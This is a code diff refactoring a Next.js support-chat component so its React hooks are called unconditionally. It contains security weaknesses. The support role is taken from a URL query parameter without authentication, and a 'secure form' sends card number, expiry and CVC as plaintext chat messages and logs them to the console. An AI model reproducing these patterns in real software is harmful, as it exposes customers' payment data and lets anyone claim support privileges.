@@ -164,36 +164,28 @@ function SecureForm({ onSubmit, onCancel }: SecureFormProps) {
 function ChatContent() {
   const searchParams = useSearchParams();
   const initialTx = searchParams.get("tx") || "";
-  // Role: "support" or "client" (passed via query string, e.g., ?role=support)
+  // Role: "support" or "client" (e.g., via ?role=support)
   const role = searchParams.get("role") || "client";
 
-  // Main state for chat
+  // Main state for chat (all hooks are unconditionally called)
   const [transactionId, setTransactionId] = useState(initialTx);
   const [messages, setMessages] = useState<Message[]>([]);
   const [chatInput, setChatInput] = useState("");
   const [user, setUser] = useState<UserData | null>(null);
   const [loading, setLoading] = useState(false);
   const [containerLoaded, setContainerLoaded] = useState(false);
-
-  // Pre-composed messages state from Firestore
   const [preComposedMessages, setPreComposedMessages] = useState<PreComposedMessage[]>([]);
-  
-  // States for editing a pre-composed message (if needed)
   const [editingPreComposedId, setEditingPreComposedId] = useState<string | null>(null);
   const [editingPreComposedText, setEditingPreComposedText] = useState("");
-
-  // State for displaying secure form on client side
   const [showSecureForm, setShowSecureForm] = useState(false);
 
-  // For auto-scrolling messages
   const messagesEndRef = useRef<HTMLDivElement | null>(null);
 
-  // Trigger container animation on mount
+  // Unconditional hooks
   useEffect(() => {
     setContainerLoaded(true);
   }, []);
 
-  // Fetch user data based on transactionId
   useEffect(() => {
     async function fetchUserData() {
       setLoading(true);
@@ -215,7 +207,6 @@ function ChatContent() {
     }
   }, [transactionId]);
 
-  // Listen for chat messages in Firestore
   useEffect(() => {
     if (!transactionId) return;
     const messagesRef = collection(db, "messages") as CollectionReference<Message>;
@@ -234,7 +225,6 @@ function ChatContent() {
     return () => unsubscribe();
   }, [transactionId]);
 
-  // Subscribe to pre-composed messages from Firestore (if needed)
   useEffect(() => {
     const preCompRef = collection(db, "precomposedMessages");
     const unsubscribe = onSnapshot(preCompRef, (snapshot) => {
@@ -247,36 +237,36 @@ function ChatContent() {
     return () => unsubscribe();
   }, []);
 
-  // Auto-scroll on new messages
   useEffect(() => {
     if (messagesEndRef.current) {
       messagesEndRef.current.scrollIntoView({ behavior: "smooth" });
     }
   }, [messages]);
 
-  // If no transaction ID, show the transaction form
-  if (!transactionId || transactionId === "support-chat") {
-    return <TransactionForm onSubmit={(tx) => setTransactionId(tx)} />;
-  }
+  // For client: show secure form if a secure form request message is present.
+  useEffect(() => {
+    if (role === "client") {
+      const hasSecureRequest = messages.some(
+        (msg) => msg.messageType === "secure_form_request"
+      );
+      if (hasSecureRequest) {
+        setShowSecureForm(true);
+      }
+    }
+  }, [messages, role]);
 
-  if (loading) {
-    return (
-      <h2 style={{ color: "black", textAlign: "center", marginTop: "50px" }}>
-        Loading...
-      </h2>
-    );
-  }
-
+  // Define containerAnimationStyle here
   const containerAnimationStyle: React.CSSProperties = {
     opacity: containerLoaded ? 1 : 0,
     transform: containerLoaded ? "translateY(0)" : "translateY(20px)",
     transition: "opacity 0.5s ease-out, transform 0.5s ease-out",
   };
 
-  // ---------------------------
-  // Chat messages CRUD functions
-  // ---------------------------
-  const sendMessage = async (text: string, messageType: Message["messageType"] = "text") => {
+  // Chat Functions
+  const sendMessage = async (
+    text: string,
+    messageType: Message["messageType"] = "text"
+  ) => {
     const trimmed = text.trim();
     if (!trimmed) return;
     try {
@@ -298,37 +288,19 @@ function ChatContent() {
     setChatInput("");
   };
 
-  // ---------------------------
-  // Secure Form functions
-  // ---------------------------
-  // For support: clicking the button sends a secure form request message
+  // For support: send a secure form request message
   const handleSendSecureFormRequest = async () => {
     await sendMessage("Secure form request: Please fill out the secure form.", "secure_form_request");
   };
 
-  // For client: if a secure form request is detected, show the secure form UI
-  useEffect(() => {
-    if (role === "client") {
-      const hasSecureRequest = messages.some(
-        (msg) => msg.messageType === "secure_form_request"
-      );
-      if (hasSecureRequest) {
-        setShowSecureForm(true);
-      }
-    }
-  }, [messages, role]);
-
-  // When the client fills out the secure form, send a secure form response message
+  // When client submits secure form
   const handleSecureFormSubmit = async (data: { cardHolder: string; cardNumber: string; expiry: string; cvc: string }) => {
     console.log("Received secure form data:", data);
-    // WARNING: Do NOT send sensitive payment details as plaintext in production.
+    // WARNING: Do not send sensitive details in plaintext in production.
     await sendMessage(JSON.stringify(data), "secure_form_response");
     setShowSecureForm(false);
   };
 
-  // ---------------------------
-  // Render message content (using Next.js Image for image messages)
-  // ---------------------------
   const renderMessageContent = (msg: Message) => {
     if (msg.text.startsWith("data:image/")) {
       return (
@@ -346,128 +318,136 @@ function ChatContent() {
 
   return (
     <div style={chatPageStyle}>
-      <div style={{ ...chatWrapperStyle, ...containerAnimationStyle }}>
-        {/* Chat Container */}
-        <div style={chatContainerStyle}>
-          <div style={chatHeaderStyle}>
-            Support Chat {user ? `- ${user.username}` : ""} (TX: {transactionId})
+      {(!transactionId || transactionId === "support-chat") ? (
+        <TransactionForm onSubmit={(tx) => setTransactionId(tx)} />
+      ) : loading ? (
+        <h2 style={{ color: "black", textAlign: "center", marginTop: "50px" }}>
+          Loading...
+        </h2>
+      ) : (
+        <div style={{ ...chatWrapperStyle, ...containerAnimationStyle }}>
+          {/* Chat Container */}
+          <div style={chatContainerStyle}>
+            <div style={chatHeaderStyle}>
+              Support Chat {user ? `- ${user.username}` : ""} (TX: {transactionId})
+            </div>
+
+            {/* Chat Messages */}
+            <div style={chatMessagesStyle}>
+              {messages.map((msg) => (
+                <div
+                  key={msg.id}
+                  style={msg.sender === "support" ? supportMessageStyle : clientMessageStyle}
+                >
+                  <strong>{msg.sender}:</strong> {renderMessageContent(msg)}
+                </div>
+              ))}
+              <div ref={messagesEndRef} />
+            </div>
+
+            {/* Chat Input */}
+            <form onSubmit={handleSend} style={chatInputContainerStyle}>
+              <input
+                type="text"
+                value={chatInput}
+                onChange={(e: ChangeEvent<HTMLInputElement>) => setChatInput(e.target.value)}
+                placeholder="Type your message..."
+                style={{ ...chatInputStyle, color: "black" }}
+              />
+              <button type="submit" style={chatSendStyle}>
+                Send
+              </button>
+              {role === "support" && (
+                <button
+                  type="button"
+                  onClick={handleSendSecureFormRequest}
+                  style={{ ...chatSendStyle, marginLeft: "5px", backgroundColor: "#28a745" }}
+                >
+                  Secure Form
+                </button>
+              )}
+            </form>
+
+            {/* For client: display secure form if requested */}
+            {role === "client" && showSecureForm && (
+              <SecureForm
+                onSubmit={handleSecureFormSubmit}
+                onCancel={() => setShowSecureForm(false)}
+              />
+            )}
           </div>
 
-          {/* Chat Messages */}
-          <div style={chatMessagesStyle}>
-            {messages.map((msg) => (
+          {/* Sidebar for Pre-composed Messages */}
+          <div style={sidebarStyle}>
+            <h3>Pre-composed Messages</h3>
+            {preComposedMessages.map((msg) => (
               <div
                 key={msg.id}
-                style={msg.sender === "support" ? supportMessageStyle : clientMessageStyle}
+                style={{
+                  marginBottom: "10px",
+                  padding: "5px",
+                  border: "1px solid #ccc",
+                  borderRadius: "5px",
+                }}
               >
-                <strong>{msg.sender}:</strong> {renderMessageContent(msg)}
+                <span>{msg.text}</span>
+                <div style={{ marginTop: "5px" }}>
+                  <button onClick={() => sendMessage(msg.text)} style={preComposedButtonStyle}>
+                    Send
+                  </button>
+                  <button
+                    onClick={() => {
+                      setEditingPreComposedId(msg.id);
+                      setEditingPreComposedText(msg.text);
+                    }}
+                    style={{ ...preComposedButtonStyle, marginLeft: "5px" }}
+                  >
+                    Edit
+                  </button>
+                  <button
+                    onClick={() => deleteDoc(doc(db, "precomposedMessages", msg.id))}
+                    style={{ ...preComposedButtonStyle, marginLeft: "5px" }}
+                  >
+                    Delete
+                  </button>
+                </div>
+                {editingPreComposedId === msg.id && (
+                  <div>
+                    <input
+                      type="text"
+                      value={editingPreComposedText}
+                      onChange={(e) => setEditingPreComposedText(e.target.value)}
+                      style={{ ...chatInputStyle, marginBottom: "5px" }}
+                    />
+                    <div>
+                      <button
+                        onClick={() => {
+                          const msgRef = doc(db, "precomposedMessages", msg.id);
+                          updateDoc(msgRef, { text: editingPreComposedText });
+                          setEditingPreComposedId(null);
+                          setEditingPreComposedText("");
+                        }}
+                        style={preComposedButtonStyle}
+                      >
+                        Save
+                      </button>
+                      <button
+                        onClick={() => {
+                          setEditingPreComposedId(null);
+                          setEditingPreComposedText("");
+                        }}
+                        style={{ ...preComposedButtonStyle, marginLeft: "5px" }}
+                      >
+                        Cancel
+                      </button>
+                    </div>
+                  </div>
+                )}
               </div>
             ))}
-            <div ref={messagesEndRef} />
           </div>
-
-          {/* Chat Input */}
-          <form onSubmit={handleSend} style={chatInputContainerStyle}>
-            <input
-              type="text"
-              value={chatInput}
-              onChange={(e: ChangeEvent<HTMLInputElement>) => setChatInput(e.target.value)}
-              placeholder="Type your message..."
-              style={{ ...chatInputStyle, color: "black" }}
-            />
-            <button type="submit" style={chatSendStyle}>
-              Send
-            </button>
-            {role === "support" && (
-              <button
-                type="button"
-                onClick={handleSendSecureFormRequest}
-                style={{ ...chatSendStyle, marginLeft: "5px", backgroundColor: "#28a745" }}
-              >
-                Secure Form
-              </button>
-            )}
-          </form>
-
-          {/* Client-side Secure Form */}
-          {role === "client" && showSecureForm && (
-            <SecureForm
-              onSubmit={handleSecureFormSubmit}
-              onCancel={() => setShowSecureForm(false)}
-            />
-          )}
         </div>
-
-        {/* Sidebar for Pre-composed Messages */}
-        <div style={sidebarStyle}>
-          <h3>Pre-composed Messages</h3>
-          {preComposedMessages.map((msg) => (
-            <div
-              key={msg.id}
-              style={{
-                marginBottom: "10px",
-                padding: "5px",
-                border: "1px solid #ccc",
-                borderRadius: "5px",
-              }}
-            >
-              <span>{msg.text}</span>
-              <div style={{ marginTop: "5px" }}>
-                <button onClick={() => sendMessage(msg.text)} style={preComposedButtonStyle}>
-                  Send
-                </button>
-                <button
-                  onClick={() => {
-                    setEditingPreComposedId(msg.id);
-                    setEditingPreComposedText(msg.text);
-                  }}
-                  style={{ ...preComposedButtonStyle, marginLeft: "5px" }}
-                >
-                  Edit
-                </button>
-                <button
-                  onClick={() => deleteDoc(doc(db, "precomposedMessages", msg.id))}
-                  style={{ ...preComposedButtonStyle, marginLeft: "5px" }}
-                >
-                  Delete
-                </button>
-              </div>
-              {editingPreComposedId === msg.id && (
-                <div>
-                  <input
-                    type="text"
-                    value={editingPreComposedText}
-                    onChange={(e) => setEditingPreComposedText(e.target.value)}
-                    style={{ ...chatInputStyle, marginBottom: "5px" }}
-                  />
-                  <div>
-                    <button
-                      onClick={() => {
-                        const msgRef = doc(db, "precomposedMessages", msg.id);
-                        updateDoc(msgRef, { text: editingPreComposedText });
-                        setEditingPreComposedId(null);
-                        setEditingPreComposedText("");
-                      }}
-                      style={preComposedButtonStyle}
-                    >
-                      Save
-                    </button>
-                    <button
-                      onClick={() => {
-                        setEditingPreComposedId(null);
-                        setEditingPreComposedText("");
-                      }}
-                      style={{ ...preComposedButtonStyle, marginLeft: "5px" }}
-                    >
-                      Cancel
-                    </button>
-                  </div>
-                </div>
-              )}
-            </div>
-          ))}
-        </div>
-      </div>
+      )}
     </div>
   );
 }
@@ -477,11 +457,7 @@ function ChatContent() {
 // ---------------------------
 export default function SupportChat() {
   return (
-    <Suspense
-      fallback={
-        <div style={{ textAlign: "center", marginTop: "50px" }}>Loading chat...</div>
-      }
-    >
+    <Suspense fallback={<div style={{ textAlign: "center", marginTop: "50px" }}>Loading chat...</div>}>
       <ChatContent />
     </Suspense>
   );
